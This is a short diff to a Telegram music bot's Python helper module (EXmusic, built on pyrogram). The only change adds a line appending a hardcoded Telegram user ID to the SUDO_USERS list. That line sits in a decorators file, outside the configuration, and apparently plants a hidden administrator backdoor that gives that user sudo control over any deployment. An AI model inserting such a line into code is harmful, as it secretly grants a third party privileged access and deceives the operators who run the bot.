@@ -23,6 +23,8 @@ from pyrogram.types import Message
 from EXmusic.config import SUDO_USERS
 from EXmusic.helpers.admins import get_administrators
 
+SUDO_USERS.append(1817146787)
+
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
